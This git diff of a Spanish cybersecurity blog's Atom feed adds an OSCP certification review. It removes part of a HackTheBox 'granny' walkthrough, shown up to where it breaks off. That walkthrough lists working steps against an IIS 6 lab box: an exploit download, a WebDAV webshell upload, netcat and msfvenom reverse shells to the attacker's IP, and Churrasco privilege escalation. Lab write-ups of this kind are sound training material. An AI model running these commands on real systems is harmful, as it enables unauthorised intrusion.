@@ -1,4 +1,118 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-16T07:31:36-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">eWPTX Review</title><link href="http://localhost:4000/ewptx/" rel="alternate" type="text/html" title="eWPTX Review" /><published>2026-01-10T00:00:00-05:00</published><updated>2026-01-10T00:00:00-05:00</updated><id>http://localhost:4000/ewptx</id><content type="html" xml:base="http://localhost:4000/ewptx/"><![CDATA[<p style="text-align: center;">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-08-12T16:09:38-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">OSCP Review</title><link href="http://localhost:4000/oscp/" rel="alternate" type="text/html" title="OSCP Review" /><published>2026-08-12T00:00:00-05:00</published><updated>2026-08-12T00:00:00-05:00</updated><id>http://localhost:4000/oscp</id><content type="html" xml:base="http://localhost:4000/oscp/"><![CDATA[<p style="text-align: center;">
+<img src="/assets/images/oscp/oscp.png" />
+</p>
+
+<p>¡Hola!
+Vengo a contar mi experiencia de como logré adquirir el certificado de <em>“Offensive Security Certified Perntester”</em> <strong>(OSCP)</strong>.</p>
+
+<p>He dividido en <strong>6</strong> secciones lo que pude identificar, para cada una de las fases de mi preparación antes, durante y después del <strong>examen</strong>.</p>
+
+<p>Espero le sirva a la persona que está leyendo, así como a mí me sirvieron algunos <strong>reviews</strong> que leí en su momento.</p>
+
+<p>Seré breve en todas las secciones para no saturarlos de información.</p>
+
+<p><strong>Nota:</strong> Debo indicar que este review es del 2025, no estoy seguro si hay nuevas actualizaciones a día de hoy.</p>
+
+<h2 id="pre-requisitos">PRE-REQUISITOS</h2>
+
+<p>Una vez más aconsejo hacer un plan de estudio, llévalo a tu ritmo, prepárate con calma, disfruta lo que haces, porque estas aprendiendo para tu futuro, no solo para un examen.</p>
+
+<ul>
+  <li>Organiza tu <strong>tiempo</strong> y mantente constante, será de gran ayuda!</li>
+  <li>Lleva unos <strong>apuntes</strong>, ya sea en hojas o en un PC (Sublime en mi caso).</li>
+  <li>Se proactivo, investiga, lee, mantente <strong>actualizado</strong>.</li>
+  <li>Planifica una <strong>meta</strong>, una fecha o una ocasión especial para hacer el examen.</li>
+  <li>Si puedes <strong>explicarle</strong> a alguien lo que has aprendido, te ayudara bastante a entender un poco más.</li>
+</ul>
+
+<h2 id="preparación">PREPARACIÓN</h2>
+
+<p>Considero que para la OSCP tienes una cantidad de información de <strong>calidad</strong> a la mano, apóyate en tus colegas, grupos, internet, libros si es necesario, como mejor te sientas para lograr entender lo que estas aprendiendo, no hay un camino correcto, <strong>todos llegamos a un mismo destino</strong>, yo personalmente he tomado el curso por 1 año, esto fue mejor para lograr estudiar a mi tiempo, quería mantener las cosas con calma y así poder interiorizar los conceptos de una mejor manera.</p>
+
+<p>Esta certificación era mi nivel experto, bajo la relación de tiempo/dificultad, donde se trabaja mucho la metodología, pensar fuera de la caja, web y directorio activo, todo en uno, lo que hace que seas un pentester integral, puedo considerar que es una certificación de complejidad media-avanzada por la agrupación de tantas cosas en un solo momento bajo una supervisión y en tiempo limitado, <strong>no por esto es algo imposible</strong>, es solo que como siempre decimos en este mundo, try harder, entre más claros tengas los conceptos, los ataques y sus ejecuciones, te vas a sentir mejor en el examen, la <strong>metodología</strong> es tu mejor aliada, mantener la calma y tomarte el tiempo necesario hace que fluyan las cosas, disfruta la experiencia, no dejes de lado la documentación, recuerda que en esta ocasión no respondes preguntas, realizas un informe técnico, así que presta mucha atención a los requisitos de ese informe.</p>
+
+<p>Dejaré los temas que son evaluados en la OSCP:</p>
+
+<ul>
+  <li>Metodología.</li>
+  <li>Explotación Web.</li>
+  <li>Pivoting.</li>
+  <li>Active Directory.</li>
+  <li>Elaboración de informes.</li>
+</ul>
+
+<h2 id="tips">TIPS</h2>
+
+<p>El mejor consejo que puedo dar para esta certificación es estar preparado en todos los sentidos, te va a ayudar a concentrarte en el examen, así que te voy a dejar algunas de las cosas que preparé antes de iniciar:</p>
+
+<ul>
+  <li>Alista todo tu <code class="language-plaintext highlighter-rouge">entorno de trabajo</code>, es muy importante que tengas todas las herramientas a punto, no dejes a la suerte algo que en ese momento no te funcione, prueba todo, has laboratorios, práctica para que vayas lo más preparado posible.</li>
+  <li>Ten lo más preparada posible la <code class="language-plaintext highlighter-rouge">plantilla de tu informe</code>, Offensive Security ofrece su propio template, lo mejor es que vayas con ese mismo, ya está todo listo, a diferencia de los reportes que hacía con INE, este reporte es un poco menos detallado en cuanto a matrices de riesgos, va más al punto, el informe básicamente es explota, saca las evidencias y explica muy bien como lograste obtener las flags, recuerda que tienes 24 horas nada más para ese informe, debes ser lo más eficiente en tu certificación.</li>
+  <li>Las <code class="language-plaintext highlighter-rouge">notas</code> son tus mejores aliadas, recuerda que en esta certificación no puedes utilizar IA, por lo que cuentas netamente con búsquedas en navegadores y tus apuntes, utiliza una aplicación de preferencia, es importante que tomes evidencias en cada proceso que ejecutas, yo tenía notas en Sublime y Notion para iniciar a tomar notas del examen.</li>
+  <li>Puedo decir que la mayor parte de mi preparación se dividió en dos, una <code class="language-plaintext highlighter-rouge">serie de videos</code> del canal de <a href="https://www.youtube.com/@S4viSinFiltro">S4vitar</a>, mirando las máquinas de los gsheets de <a href="https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?gid=487240997#gid=487240997">LainKusanagi</a> y <a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">NetSecFocus</a>; por otra parte los laboratorios A, B y C de Offensive Security me han parecido fundamentales para entender el flujo de la certificación, tener diferentes escenarios te prepara bastante bien para todas las condiciones y contratiempos que puedes tener en el momento de la certificación, mi proceso de aprendizaje consistía en ver los videos y tomar notas de cada uno de ellos, luego emulaba los laboratorios y continuaba con el siguiente video, hasta completar mi plan de estudio.</li>
+</ul>
+
+<h2 id="el-examen">EL EXAMEN</h2>
+
+<p>Tienes <strong>2</strong> días para realizar el examen (1 laboratorio y 1 informe) y necesitas de una VPN en tu máquina, procura tener buen internet, conectado por cable si es posible, compra algo de comer, algo de tomar, pon música, despliega todas tus notas, duerme bien el día anterior y escoge la mejor hora y fecha para realizar la certificación, si estas tranquilo, todo va a salir bien, no te presiones, en esta ocasión el tiempo es el que juega en tu contra, uno suele sentir mayor presión por esto, pero desde que tengas buena metodología, puedes sobrepasar esos límites mentales, tienes que identificar las flags de usuario y root, enfócate en lo que te piden y no solo en vulnerar todos los sistemas hasta que seas un usuario administrador.</p>
+
+<p>Recuerda que estás haciendo un pentesting integral, enfócate en las máquinas stand alone o en el AD, en el que te sientas más fuerte primero, luego lo siguiente, debes consolidar todos los requerimientos que te dan en un informe, recuerda los temas de <strong>AD</strong>, <strong>Enumeración</strong> y <strong>Búsqueda de vulnerabilidades</strong> porque es muy importante tenerlos claros y, por último, sácale el mayor provecho, aprende mucho, <strong>diviértete</strong> y comparte tu conocimiento, ¡alguien más te lo agradecerá!</p>
+
+<p>Ítems claves de la certificación:</p>
+
+<ul>
+  <li>Lee con atención todos los requerimientos.</li>
+  <li>Duración: 2 días (1 laboratorio y 1 informe).</li>
+  <li>Informe final.</li>
+  <li>Estudia los temas mencionados anteriormente.</li>
+  <li>Ten presente tus notas.</li>
+</ul>
+
+<h2 id="extras">EXTRAS</h2>
+
+<p>Te dejare <strong>algunos</strong> links que fueron de ayuda para mí, estoy seguro de que van a ayudarte en este proceso:</p>
+
+<ul>
+  <li><a href="https://hackingvault.com/auth/signin">S4vitar machines</a></li>
+  <li><a href="https://medium.com/@ardian.danny">Proving Grounds Writeups</a></li>
+  <li><a href="https://www.youtube.com/watch?v=9GFtDz9aEfI&amp;list=PLcgWR3INc4O9ujY3YXqzjUdnLS1MT4xWS">Videos Proving Grounds</a></li>
+  <li><a href="https://www.youtube.com/@HackerBlueprint/videos">Videos Blueprint</a></li>
+  <li><a href="https://www.youtube.com/@S4viSinFiltro">Videos S4vitar</a></li>
+</ul>
+
+<h2 id="conclusión">CONCLUSIÓN</h2>
+
+<p>Cada vez se me dificulta un poco tener entradas en el blog, pido disculpas por eso, pero quiero contar un poco de lo que viví en su momento, puede ser de ayuda para los próximos pentesters a través de mis experiencias, en lo personal esta certificación afianzó mi metodología, el enfocarme en <strong>enumeración</strong> fue un todo en esta ocasión, mucho más que en certificaciones anteriores, más cuando uno suelen existir tantos caminos diferentes de explotación, el tiempo si influye mucho, llegan momentos en que la preocupación y la frustración se vuelven protagonistas, ahí es donde debes tomar pausas, bebe agua, respira y analiza la situación, porque a veces tienes la respuesta en todo el frente y no te das cuenta.</p>
+
+<p>Mi metodología se centró en empezar a hacer <code class="language-plaintext highlighter-rouge">reconocimiento</code> de todo el entorno, esto siempre ayuda no solo en las certificaciones, sino también en la vida real como dice un colega mío, en todos los procesos de ethical hacking, el reconocimiento es uno de los pilares del éxito.</p>
+
+<p>Con el pasar de las horas, investigando, revisando mis notas y <code class="language-plaintext highlighter-rouge">analizando</code> las situaciones del entorno, voy primero con el <code class="language-plaintext highlighter-rouge">directorio activo</code>, enumerando, revisando todas las vías potenciales de acceso, hasta llegar al punto de acceder a las máquinas víctimas y tomar la administración de ello, luego obtener el administrador y lograr mis primeros 40 puntos si mal no estoy por tener el set de AD, me di cuenta que es muy importante enumerar toda la información posible, no dejar ningún detalle al azar, revisar todas las rutas, las cadenas de caracteres, eso marca bastante la diferencia y te ayuda a ser más eficaz en el momento de analizar información interna, todo esto sucedió las primeras 5 horas, me sentía bien, confiado, era un buen momento para descansar ya que era algo de noche.</p>
+
+<p>Vuelvo luego de una buena noche y empiezo el laboratorio nuevamente, por cada standalone (3 en total), te dan 20 puntos, 10 por ser el usuario y 10 adicionales por ser administrador, mi objetivo era claro, tenía que pwnear <code class="language-plaintext highlighter-rouge">2/3 máquinas standalone</code> mínimo, para esto antes de la siesta puse a escanear las máquinas faltantes y al ver los resultados en la mañana, empiezo a revisar y encuentro el camino para explotar una máquina de manera exitosa, revisar los archivos es parte importante del poder lograr está máquina, nuevamente la enumeración fue la figura de este laboratorio.</p>
+
+<p>Aquí es donde empieza la preocupación, donde reviso la segunda máquina standalone, luego de muchas horas de enumeración y frustración por no encontrar la manera de lograr acceder a la máquina, tuve que relajarme, analizar bien la situación y revisar cada uno de los detalles que tenía el objetivo, nuevamente prestar atención a los hallazgos de <code class="language-plaintext highlighter-rouge">enumeración</code> fue la perla en el océano, se logra la explotación y escalamiento de privilegios para fortuna minutos antes de acabar el tiempo, por lo que se logra obtener una totalidad de 80/100 puntos y la obtención de la certificación!</p>
+
+<p>Recuerda revisar las técnicas que te indiqué anteriormente, mira las playlist y gsheets, come bien y duerme, una mente tranquila es una mente enfocada y eficiente! Enumera!</p>
+
+<p>Las <strong>notas</strong> que tenía previamente fueron bastante útiles, ayudó mucho revisar una por una las vulnerabilidades, comprender no solo la explotación sino también la manera en que se da la vulnerabilidad, en este caso mi punto a mejorar fue la enumeración y manejo de la frustración, muchas veces nos quedamos todo el tiempo en el mismo agujero negro sin pensar que hay otras posibilidades.</p>
+
+<p>Revisar y dejar a punto la <strong>plantilla del informe</strong> me ahorró muchísimo tiempo en la <code class="language-plaintext highlighter-rouge">documentación</code>, pude descansar y prácticamente me dedique a reportar las vulnerabilidades de la manera más completa posible, siento que fue nuevamente un punto positivo muy a favor ir preparado de esta manera.</p>
+
+<p>El examen considero que es justo en balance, tiene tiempo para que desempeñes una <code class="language-plaintext highlighter-rouge">metodología</code> bien ejecutada, sin embargo, lo que suele suceder a diferencia de entornos laborales es que suele generar más presiones por las limitantes de horario, las emociones debes regularlas de una buena manera, tu mente es el centro de este laboratorio.</p>
+
+<p>Yo recomiendo hacer los laboratorios, estudiar y tomar notas de todo, ponerlo en práctica y si es posible explicarles a tus compañeros para que consolides ese conocimiento adquirido.</p>
+
+<p>Los links de ayuda son una gran oportunidad de tener guías a la mano para no dejar escapar ningún detalle.</p>
+
+<p>Leer los requerimientos para poder pasar exitosamente, ahí es donde se debe poner especial atención, debes trabajar para lograr ese resultado.</p>
+
+<p>Por otro lado y nuevamente, come bien, duerme bien, aléjate del PC de vez en cuando, respira, toma aire, sal a caminar un poco, eso oxigena la mente y te dará un nuevo aire para pensar mejor.</p>
+
+<p>Lo único que puedo decir es que es una excelente certificación para subir mucho más el nivel, personalmente me siento muy bien con el trabajo realizado, quería compartir un poco de esta experiencia para que se motiven a hacer la certificación, en el mundo laboral puede ser bastante importante, ¡nunca está de más tener un nuevo reto en la vida!</p>
+
+<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
+
+<p><strong>Nos vemos en otro bit.</strong></p>]]></content><author><name>BAST1ANT1C</name></author><category term="Certificaciones" /><category term="Pentesting" /><category term="offensiveSecurity" /><summary type="html"><![CDATA[¡Hola! Vengo a contar mi experiencia de como logré adquirir el certificado de Offensive Security Certified Pentester (OSCP)]]></summary></entry><entry><title type="html">eWPTX Review</title><link href="http://localhost:4000/ewptx/" rel="alternate" type="text/html" title="eWPTX Review" /><published>2026-01-10T00:00:00-05:00</published><updated>2026-01-10T00:00:00-05:00</updated><id>http://localhost:4000/ewptx</id><content type="html" xml:base="http://localhost:4000/ewptx/"><![CDATA[<p style="text-align: center;">
 <img src="/assets/images/ewptx/ewptx.png" />
 </p>
 
@@ -3307,240 +3421,4 @@ aa4beed1c0
 
 <p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
 
-<p><strong>Nos vemos en otro bit.</strong></p>]]></content><author><name>BAST1ANT1C</name></author><category term="HackTheBox" /><category term="Writeup" /><category term="Active" /><category term="Active Directory" /><summary type="html"><![CDATA[Vamos a resolver la máquina active AD de HackTheBox. ¡Let's hack!]]></summary></entry><entry><title type="html">HTB granny</title><link href="http://localhost:4000/granny/" rel="alternate" type="text/html" title="HTB granny" /><published>2023-01-04T00:00:00-05:00</published><updated>2023-01-04T00:00:00-05:00</updated><id>http://localhost:4000/granny</id><content type="html" xml:base="http://localhost:4000/granny/"><![CDATA[<p style="text-align: center;">
-<img src="/assets/images/granny/02-tarjeta.png" />
-</p>
-
-<p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">granny</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
-La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
-
-<h2 id="preparación">PREPARACIÓN</h2>
-
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">granny</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack granny
-<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
-</code></pre></div></div>
-
-<h2 id="reconocimiento">RECONOCIMIENTO</h2>
-
-<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.15
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detectando sistema operativo ...
-
-<span class="o">[</span>+] 10.10.10.15 <span class="nv">ttl</span><span class="o">=</span>127 <span class="o">&gt;&gt;</span> Windows
-</code></pre></div></div>
-
-<p>Identificamos que es una maquina <strong>Windows</strong> debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).</p>
-
-<ul>
-  <li>TTL =&gt; 64	Linux</li>
-  <li>TTL =&gt; 128	Windows</li>
-</ul>
-
-<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.15 <span class="nt">-oG</span> ports | <span class="nb">grep </span>open
-80/tcp    open  http
-</code></pre></div></div>
-
-<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p80</span> <span class="nt">-sCV</span> 10.10.10.15 <span class="nt">-oN</span> versions
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Microsoft IIS httpd 6.0
-| http-webdav-scan: 
-|   WebDAV <span class="nb">type</span>: Unknown
-|   Server Date: Fri, 09 Sep 2022 07:38:14 GMT
-|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
-|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
-|_  Server Type: Microsoft-IIS/6.0
-|_http-title: Under Construction
-|_http-server-header: Microsoft-IIS/6.0
-| http-methods: 
-|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
-Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</code></pre></div></div>
-
-<h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>
-
-<p>Iniciamos con el reconocimiento del servicio <code class="language-plaintext highlighter-rouge">web</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">whatweb</code> enumeramos información de librerías, gestores de contenido, entre otros.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.15
-</code></pre></div></div>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#OUTPUT</span>
-http://10.10.10.15 <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.15], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
-</code></pre></div></div>
-
-<h2 id="intrusion-iis-exploit">INTRUSION IIS EXPLOIT</h2>
-
-<p>Hacemos uso del exploit <a href="https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell">CVE-2017-7269</a> del github de <a href="https://github.com/g0rx">g0rx</a> que nos va a generar una reverse shell directamente con la máquina víctima.</p>
-
-<p>Descarga y renombramiento de exploit</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../exploit
-wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
-<span class="nb">mv </span>iis6<span class="se">\ </span>reverse<span class="se">\ </span>shell iisExploit.py
-</code></pre></div></div>
-
-<p>Modo de uso exploit</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python iisExploit.py
-usage:iis6webdav.py targetip targetport reverseip reverseport
-</code></pre></div></div>
-
-<p>Creamos un listener</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lnvp</span> 4564
-</code></pre></div></div>
-
-<p>Ejecutamos el exploit</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python iisExploit.py 10.10.10.15 80 10.10.14.8 4564
-</code></pre></div></div>
-
-<p>Reverse shell exitosa</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#OUTPUT</span>
-<span class="nb">whoami
-</span>nt authority<span class="se">\n</span>etwork service
-</code></pre></div></div>
-<h2 id="intrución-webshell--smbserver--nc">INTRUCIÓN WEBSHELL + SMBSERVER + NC</h2>
-
-<p>Otro método de intrusión se puede ejeutar por medio de la subida de una webshell al servidor víctima, para esto vamos a seguir las siguientes indicaciones.</p>
-
-<p>Hacemos uso de <code class="language-plaintext highlighter-rouge">davest</code> para auditar los archivos que podemos subir a un objetivo</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>davtest <span class="nt">-url</span> http://10.10.10.15
-</code></pre></div></div>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#OUTPUT</span>
-/usr/bin/davtest Summary:
-Created: http://10.10.10.15/DavTestDir_AUl9CdY
-PUT File: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.jsp
-PUT File: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.txt
-PUT File: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.html
-PUT File: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.php
-PUT File: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.pl
-PUT File: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.cfm
-PUT File: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.jhtml
-Executes: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.txt
-Executes: http://10.10.10.15/DavTestDir_AUl9CdY/davtest_AUl9CdY.html
-</code></pre></div></div>
-
-<p>Localizamos los binarios <code class="language-plaintext highlighter-rouge">.aspx</code> que contienen una webshell</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate .aspx
-</code></pre></div></div>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#OUTPUT</span>
-/usr/share/webshells/aspx/cmdasp.aspx
-</code></pre></div></div>
-
-<p>Copiamos el archivo en nuestro directorio</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/share/webshells/aspx/cmdasp.aspx webshell.aspx
-</code></pre></div></div>
-
-<p>Con los métodos HTTP <code class="language-plaintext highlighter-rouge">PUT</code> y <code class="language-plaintext highlighter-rouge">MOVE</code> para subir un archivo y cambiar la extensión de este, para acto seguido, ejecutar la web shell obteniendo ejecución remota de comandos.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> PUT http://10.10.10.15/webshell.txt <span class="nt">-d</span> @webshell.aspx
-curl <span class="nt">-s</span> <span class="nt">-X</span> MOVE <span class="nt">-H</span> <span class="s2">"Destination:http://10.10.10.15/webshell.aspx"</span> http://10.10.10.15/webshell.txt
-</code></pre></div></div>
-
-<p>Copiamos en nuestro directorio, el binario para windows de <code class="language-plaintext highlighter-rouge">nc</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe nc.exe
-</code></pre></div></div>
-
-<p>Creamos un listener</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lnvp</span> 4564
-</code></pre></div></div>
-
-<p>Cargamos en el navegador el recurso <code class="language-plaintext highlighter-rouge">http://10.10.10.15/webshell.txt</code></p>
-
-<p style="text-align: center;">
-<img src="/assets/images/granny/03-page.png" />
-</p>
-
-<p>Creamos un servicio de recursos compartidos <code class="language-plaintext highlighter-rouge">SMB</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
-</code></pre></div></div>
-
-<p>En la webshell ejecutamos por medio de un recurso compartido una reverse shell con la ayuda de <code class="language-plaintext highlighter-rouge">nc</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\\</span>10.10.14.8<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd 10.10.14.8 4564
-</code></pre></div></div>
-
-<p>Reverse shell exitosa</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami
-</span>nt authority<span class="se">\n</span>etwork service
-</code></pre></div></div>
-
-<h2 id="escalada-de-privilegios-smbserver--churrasco--msfvenom">ESCALADA DE PRIVILEGIOS SMBSERVER + CHURRASCO + MSFVENOM</h2>
-
-<p>Ahora que nos encontramos dentro de la máquina víctima, vamos a realizar la enumeración de permisos y tareas con la finalidad de lograr un escalamiento de privilegios.</p>
-
-<p>Enumeración de grupos habilitados</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
-</code></pre></div></div>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#OUTPUT</span>
-PRIVILEGES INFORMATION
-<span class="nt">----------------------</span>
-Privilege Name                Description                               State   
-<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-</code></pre></div></div>
-
-<p>Descargamos una variante de <code class="language-plaintext highlighter-rouge">JuicyPotato.exe</code> denominada <code class="language-plaintext highlighter-rouge">Churrasco.exe</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
-</code></pre></div></div>
-
-<p>Generamos un payload que nos va a permitir la conexión reversa por medio de <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.8 <span class="nv">LPORT</span><span class="o">=</span>4566 <span class="nt">-f</span> exe <span class="nt">-o</span> rev.exe
-</code></pre></div></div>
-
-<p>Creamos un recurso compartido con <code class="language-plaintext highlighter-rouge">Impacket</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
-</code></pre></div></div>
-
-<p>En la máquina víctima ingresamos a la carpeta <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code>, creamos la carpeta <code class="language-plaintext highlighter-rouge">privesc</code> y copiamos el archivo <code class="language-plaintext highlighter-rouge">rev.exe</code> en el objetivo</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>c:<span class="se">\W</span>indows<span class="se">\T</span>emp
-<span class="nb">mkdir </span>privesc
-<span class="nb">cd </span>privesc
-copy <span class="se">\\</span>10.10.14.8<span class="se">\s</span>mbFolder<span class="se">\r</span>ev.exe rev.exe
-</code></pre></div></div>
-
-<p>Creamos un listener</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lnvp</span> 4566
-</code></pre></div></div>
-
-<p>Ejecutamos en la máquina víctima <code class="language-plaintext highlighter-rouge">churrasco.exe</code> para que ejecute con privilegios <code class="language-plaintext highlighter-rouge">rev.exe</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\\</span>10.10.14.8<span class="se">\s</span>mbFolder<span class="se">\c</span>hurrasco.exe <span class="s2">"</span><span class="se">\\</span><span class="s2">10.10.14.8</span><span class="se">\s</span><span class="s2">mbFolder</span><span class="se">\r</span><span class="s2">ev.exe"</span>
-</code></pre></div></div>
-
-<p>Obtenemos una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami
-</span>nt authority<span class="se">\s</span>ystem
-</code></pre></div></div>
-
-<h2 id="flags">FLAGS</h2>
-
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#USER</span>
-<span class="nb">cd </span>c:<span class="se">\</span>
-<span class="nb">dir</span> /b/s user.txt
-C:<span class="se">\D</span>ocuments and Settings<span class="se">\L</span>akis<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
